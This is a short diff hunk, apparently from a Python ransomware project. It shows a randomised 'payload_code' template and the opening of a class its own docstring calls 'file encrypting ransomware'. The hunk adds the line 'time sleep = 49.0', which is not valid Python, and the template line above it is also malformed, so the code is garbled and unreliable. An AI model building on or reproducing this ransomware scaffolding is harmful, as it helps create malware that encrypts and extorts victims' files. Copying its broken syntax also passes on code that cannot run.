@@ -71,6 +71,8 @@ payload_code = f"""
 def real_payload_{rnd1}():
      Version {rnd1}")
 """
+time sleep = 49.0
+
 class Ransomware:
     """ This class represents file encrypting ransomware.
     """
